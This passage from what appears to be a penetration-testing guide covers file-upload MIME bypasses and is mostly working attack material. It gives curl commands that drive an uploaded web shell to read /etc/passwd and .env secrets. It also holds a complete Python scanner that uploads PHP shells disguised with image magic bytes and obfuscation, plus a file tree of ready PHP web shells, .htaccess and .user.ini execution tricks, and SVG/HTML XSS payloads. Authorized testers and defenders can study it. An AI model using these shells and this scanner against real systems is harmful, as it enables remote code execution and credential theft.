if echo "$RESPONSE" | grep -qP '[a-f0-9]{32}'; then
  echo "[!!!] RCE CONFIRMED — PHP code executed!"
  echo "Response: $RESPONSE"
else
  echo "[-] PHP did not execute. Try chaining techniques."
fi
```

#### Execute System Commands

```bash
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php?cmd=whoami"
curl "https://target.com/uploads/shell.php?cmd=uname+-a"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
curl "https://target.com/uploads/shell.php?cmd=cat+/var/www/html/.env"
curl "https://target.com/uploads/shell.php?cmd=ls+-la+/var/www/"
curl "https://target.com/uploads/shell.php?cmd=env"
```

::

---

## Comprehensive MIME Scanner

::code-collapse
```python [Full MIME Bypass Scanner]
#!/usr/bin/env python3
"""
Comprehensive MIME Type Spoofing Scanner
Tests Content-Type manipulation, magic bytes, combined bypasses,
obfuscated shells, and edge cases.

Usage:
  python3 mime_scan.py -u https://target.com/upload -c "session=abc" -f file [-d https://target.com/uploads/]
"""
import requests, argparse, io, hashlib, time, sys, urllib3
urllib3.disable_warnings()

class MIMEScanner:
    def __init__(self, url, cookie, field="file", upload_dir=None, proxy=None):
        self.url, self.field, self.upload_dir = url, field, upload_dir
        self.s = requests.Session()
        self.s.verify = False
        for c in cookie.split(";"):
            if "=" in c:
                k, v = c.strip().split("=", 1)
                self.s.cookies.set(k, v)
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.marker = f"mime_{int(time.time())}"
        self.expected = hashlib.md5(self.marker.encode()).hexdigest()
        self.shell = f'<?php echo md5("{self.marker}"); ?>'.encode()
        self.R = {"uploaded": [], "executed": [], "total": 0}
        self.magic = {
            'none': b'', 'gif89a': b'GIF89a\n', 'gif87a': b'GIF87a\n',
            'jpeg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
            'jpeg_exif': b'\xff\xd8\xff\xe1\x00\x00',
            'png': b'\x89PNG\r\n\x1a\n',
            'bmp': b'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00',
            'pdf': b'%PDF-1.4\n', 'webp': b'RIFF\x00\x00\x00\x00WEBP',
            'tiff': b'\x49\x49\x2a\x00',
        }

    def upload(self, fn, content, mime):
        try:
            r = self.s.post(self.url, files={self.field: (fn, io.BytesIO(content), mime)}, timeout=10)
            ok = r.status_code in [200,201,204] and "error" not in r.text.lower()[:300]
            return ok, r.status_code
        except: return False, 0

    def check_exec(self, fn):
        if not self.upload_dir: return False
        try:
            r = self.s.get(f"{self.upload_dir.rstrip('/')}/{fn}", timeout=5)
            return self.expected in r.text
        except: return False

    def test(self, desc, fn, content, mime):
        self.R["total"] += 1
        ok, st = self.upload(fn, content, mime)
        if ok:
            self.R["uploaded"].append(f"{desc}")
            if self.check_exec(fn):
                self.R["executed"].append(desc)
                print(f"  [🔥RCE] {desc}")
            else:
                print(f"  [✓ UP]  {desc}")
        return ok

    def run(self):
        # Phase 1: Content-Type spoofing
        print("\n═══ PHASE 1: Content-Type Spoofing ═══")
        for m in ["image/jpeg","image/png","image/gif","image/bmp","image/webp","image/tiff",
                   "image/svg+xml","image/x-icon","image/avif","image/pjpeg","image/x-png",
                   "application/pdf","application/octet-stream","text/plain","text/html",
                   "application/xml","application/json","",
                   "IMAGE/JPEG","Image/Jpeg","image/jpeg; charset=utf-8","image/jpeg;","*/*"]:
            self.test(f"CT:{repr(m)[:40]}", "shell.php", self.shell, m)

        # Phase 2: Magic bytes
        print("\n═══ PHASE 2: Magic Byte Injection ═══")
        mm = {'gif89a':'image/gif','gif87a':'image/gif','jpeg':'image/jpeg',
              'jpeg_exif':'image/jpeg','png':'image/png','bmp':'image/bmp',
              'pdf':'application/pdf','webp':'image/webp','tiff':'image/tiff'}
        for mn,md in self.magic.items():
            if mn == 'none': continue
            mi = mm.get(mn,'application/octet-stream')
            self.test(f"Magic:{mn}+.php+{mi}", "shell.php", md+self.shell, mi)
            self.test(f"Magic:{mn}+.php+octet", "shell.php", md+self.shell, "application/octet-stream")

        # Phase 3: Combined
        print("\n═══ PHASE 3: Combined Bypass ═══")
        combos = [
            ('gif89a','image/gif','shell.php','GIF+php+gif'),
            ('gif89a','image/gif','shell.gif','GIF+gif+gif'),
            ('gif89a','image/gif','shell.php.gif','GIF+dblext+gif'),
            ('jpeg','image/jpeg','shell.php','JPG+php+jpg'),
            ('jpeg','image/jpeg','shell.jpg','JPG+jpg+jpg'),
            ('jpeg','image/jpeg','shell.php.jpg','JPG+dblext+jpg'),
            ('png','image/png','shell.php','PNG+php+png'),
            ('png','image/png','shell.png','PNG+png+png'),
            ('png','image/png','shell.php.png','PNG+dblext+png'),
            ('gif89a','image/gif','shell.phtml','GIF+phtml+gif'),
            ('gif89a','image/gif','shell.phar','GIF+phar+gif'),
            ('gif89a','image/gif','shell.php5','GIF+php5+gif'),
            ('gif89a','image/gif','shell.php.xyz','GIF+unknown+gif'),
            ('gif89a','image/jpeg','shell.php','GIF_magic+jpg_mime (mismatch)'),
            ('jpeg','image/gif','shell.php','JPG_magic+gif_mime (mismatch)'),
        ]
        for mn,mi,fn,desc in combos:
            self.test(desc, fn, self.magic.get(mn,b'')+self.shell, mi)

        # Phase 4: Obfuscated shells
        print("\n═══ PHASE 4: Obfuscated Shells ═══")
        obfs = {
            'short': b'<?=`$_GET[c]`?>',
            'b64': b'<?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?>',
            'concat': b'<?php $a="sys"."tem";$a($_GET["cmd"]); ?>',
            'chr': b'<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_GET["cmd"]); ?>',
            'var': b'<?php $_GET["f"]($_GET["c"]); ?>',
            'rot13': b'<?php $a=str_rot13("flfgrz");$a($_GET["cmd"]); ?>',
        }
        for n,sh in obfs.items():
            self.test(f"Obf:{n}+GIF", f"shell_{n}.php", b'GIF89a\n'+sh, "image/gif")

        # Phase 5: Edge cases
        print("\n═══ PHASE 5: Edge Cases ═══")
        for n,fn,ct,mi in [
            ("empty_ct","shell.php",self.shell,""),
            ("space_ct","shell.php",self.shell," "),
            ("wildcard","shell.php",self.shell,"*/*"),
            ("img_wild","shell.php",self.shell,"image/*"),
            ("no_subtype","shell.php",self.shell,"image"),
            ("long_mime","shell.php",self.shell,"image/"+"A"*500),
            ("null_byte","shell.php",self.shell,"image/jpeg\x00"),
        ]:
            self.test(f"Edge:{n}", fn, ct, mi)

        # Summary
        print(f"\n{'═'*55}")
        print(f"  DONE — {self.R['total']} tests | {len(self.R['uploaded'])} uploaded | {len(self.R['executed'])} RCE")
        print(f"{'═'*55}")
        if self.R['executed']:
            print("\n  🔥 RCE CONFIRMED:")
            for e in self.R['executed']: print(f"    → {e}")
        if self.R['uploaded']:
            print(f"\n  📁 Uploaded ({len(self.R['uploaded'])}):")
            for u in self.R['uploaded'][:25]: print(f"    → {u}")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("-u","--url",required=True)
    p.add_argument("-c","--cookie",required=True)
    p.add_argument("-f","--field",default="file")
    p.add_argument("-d","--upload-dir",default=None)
    p.add_argument("-p","--proxy",default=None)
    a = p.parse_args()
    MIMEScanner(a.url, a.cookie, a.field, a.upload_dir, a.proxy).run()
```
::

---

## Payload File Tree

::code-tree{default-value="shells/php_system.php"}
```php [shells/php_system.php]
<?php system($_GET['cmd']); ?>
```

```php [shells/php_shell_exec.php]
<?php echo shell_exec($_GET['cmd']); ?>
```

```php [shells/php_short.php]
<?=`$_GET[c]`?>
```

```php [shells/php_obfuscated.php]
<?php $a=base64_decode('c3lzdGVt');$a($_GET['c']); ?>
```

```php [shells/php_var_func.php]
<?php $_GET['f']($_GET['c']); ?>
```

```bash [magic_bytes/gif89a_shell.php]
GIF89a
<?php system($_GET["cmd"]); ?>
```

```bash [magic_bytes/jpeg_shell.php]
# Binary: \xff\xd8\xff\xe0\x00\x10JFIF\x00
# Followed by: <?php system($_GET["cmd"]); ?>
```

```bash [magic_bytes/png_shell.php]
# Binary: \x89PNG\r\n\x1a\n
# Followed by: <?php system($_GET["cmd"]); ?>
```

```text [config/.htaccess]
AddType application/x-httpd-php .jpg .png .gif
```

```text [config/.user.ini]
auto_prepend_file=shell.jpg
```

```xml [xss/svg_onload.svg]
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
```

```xml [xss/svg_script.svg]
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
```

```html [xss/html_xss.html]
<html><body><script>alert(document.domain)</script></body></html>
```
::

---

## Testing Methodology Checklist

- **Establish baseline** — upload a legitimate file and note the success response pattern
- **Identify validation layers** — run the detection script to determine which checks are in place
- **Test Content-Type spoofing** — change the MIME type to all common image types
- **Test non-image MIME types** — try document, text, generic, and empty values
- **Test Content-Type edge cases** — casing, whitespace, parameters, duplicates
- **Test magic byte injection** — prepend GIF89a, JPEG, PNG headers to shell
- **Test EXIF metadata injection** — embed PHP code in EXIF fields of real images
- **Test polyglot files** — JPEG/PHP, GIF/PHP, PNG/PHP polyglots
- **Test multipart manipulation** — boundary tricks, Content-Disposition, duplicate fields, chunked encoding
- **Test combined bypasses** — magic bytes + spoofed MIME + double extension
- **Test execution chains** — `.htaccess`, `.user.ini`, LFI, Nginx path info
- **Test XSS vectors** — SVG upload, HTML upload, MIME sniffing, filename reflection
- **Verify execution** — access uploaded file, check Content-Type, test command execution
- **Document findings** — reproduction steps, CVSS score, impact statement